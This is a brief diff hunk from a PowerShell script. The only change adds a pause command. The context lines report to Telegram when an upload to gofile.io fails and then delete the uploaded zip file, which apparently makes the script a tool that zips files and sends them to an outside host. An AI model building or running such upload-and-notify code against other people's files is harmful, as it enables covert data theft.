@@ -125,6 +125,6 @@ if ($link -ne $null) {
 } else {
     Send-TelegramMessage -message "Failed to upload file to gofile.io"
 }
-
+cmd /c 'pause'
 # Remove the zip file after uploading
 Remove-Item $outputZip
